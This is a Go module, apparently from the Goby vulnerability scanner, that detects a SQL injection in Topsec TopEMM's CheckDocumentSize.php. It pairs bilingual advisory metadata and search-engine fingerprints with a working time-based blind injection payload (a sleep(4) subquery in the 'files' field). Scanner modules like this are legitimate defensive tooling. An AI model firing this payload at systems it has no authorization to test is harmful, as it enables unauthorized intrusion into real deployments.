package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Topsec TopEMM CheckDocumentSize.php SQLi",
    "Description": "TOPSEC TopEMM Platform Exists a SQL Injection Vulnerability, An attacker can use this vulnerability to obtain sensitive data.",
    "Impact": "Topsec TopEMM CheckDocumentSize.php SQLi",
    "Recommendation": "<p>1. Contact the manufacturer to upgrade: <a href=\"http://www.topsec.com.cn/\"> http://www.topsec.com.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit the public network from accessing the system. </p>",
    "Product": "Topsec-TopEMM",
    "VulType": [
        "SQL Injection"
    ],
    "Tags": [
        "SQL Injection"
    ],
    "Translation": {
        "CN": {
            "Name": "天融信企业移动信息安全管理平台存在sql注入漏洞",
            "Description": "天融信移动设备管理系统TopEMM,为客户提供企业移动信息化过程中的整体移动安全解决方案.保障政府",
            "Impact": "<p><span style=\"color: rgb(234, 67, 53); font-size: 14px;\"></span>天融信移动设备管理系统TopEMM,为客户提供企业移动信息化过程中的整体移动安全解决方案.保障政府。<span style=\"color: rgb(77, 81, 86); font-size: 14px;\"></span><br></p><p>该系统存在sql注入漏洞，<span style=\"color: rgb(51, 51, 51); font-size: 16px;\">通过SQL注入利用，获取数据库信息，对数据库进行操作，更改数据库数据。</span></p>",
            "Recommendation": "<p style=\"text-align: start;\">1、联系厂商进行升级：<a href=\"http://www.topsec.com.cn/\" rel=\"nofollow\">http://www.topsec.com.cn/</a></p><p style=\"text-align: start;\">2、部署Web应用防火墙，对数据库操作进行监控。</p><p style=\"text-align: start;\">3、如非必要，禁止公网访问该系统。</p>",
            "Product": "天融信企业移动信息安全管理平台",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Topsec TopEMM CheckDocumentSize.php SQLi",
            "Description": "TOPSEC TopEMM Platform Exists a SQL Injection Vulnerability, An attacker can use this vulnerability to obtain sensitive data.",
            "Impact": "Topsec TopEMM CheckDocumentSize.php SQLi",
            "Recommendation": "<p style=\"text-align: start;\">1. Contact the manufacturer to upgrade: <a href=\"http://www.topsec.com.cn/\" rel=\"nofollow\"> http://www.topsec.com.cn/</a></p><p style=\"text-align: start;\">2. Deploy a web application firewall to monitor database operations. </p><p style=\"text-align: start;\">3. If not necessary, prohibit the public network from accessing the system. </p>",
            "Product": "Topsec-TopEMM",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "FofaQuery": "title=\"天融信\" && title=\"企业移动\"",
    "GobyQuery": "title=\"天融信\" && title=\"企业移动\"",
    "Author": "itardc@163.com",
    "Homepage": "https://www.topsec.com.cn/",
    "DisclosureDate": "2021-04-14",
    "References": [],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "TOPSEC-EMM"
        ]
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/resources/data/document/CheckDocumentSize.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Data = "files=(select*from(select(sleep(4)))a)&folders="
			startTime := time.Now().Unix()
			httpclient.DoHttpRequest(u, cfg)
			endTime := time.Now().Unix()
			if endTime-startTime >= 4 {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			return expResult
		},
	))
}
